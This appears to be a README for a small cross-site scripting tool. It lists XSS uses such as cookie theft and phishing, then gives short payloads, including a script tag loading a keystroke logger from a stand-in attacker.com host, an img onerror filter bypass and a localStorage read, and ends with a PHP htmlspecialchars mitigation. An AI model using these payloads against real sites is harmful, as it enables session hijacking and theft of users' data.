# XSS4FUN :cookie:
Cross-Site-Scripting just for fun.

## Cross-Site-Scripting Applications:
  - Steal cookies for session hijacking.
  - Modify Webpage to perform phishing.
  - Inject malicious code.
## Basic payloads:
  - <script>alert(1)</script>

## Useful payloads:
  - **<script src=https://attacker.com/keystroke.js > </script>**
    - To include malicious javascript code in page.
  - **\<img src=anything onerror=alert(1) >**
    - When the **<script>** is being filtered by the Web Application, you can use javascript events.
  - **<script>alert(localStorage.getItem('salary'))</script>**
    - To collect sensitive information stored in Browser Local Storage.
 
## Automated Detection
  ## xss4fun.py
  Using selenium to find input fields and inject payloads, if the injection is sucessful, a printscreen is made.

## Mitigations    
  ## PHP
   Using **htmlspecialchars** to convert special characters to HTML.
  ```
  $word = htmlspecialchars($_GET['word']);
  ```
  So this **<script>alert(1)</script>** becomes this **\&lt;script\&gt;alert(1)\&lt;/script&gt**
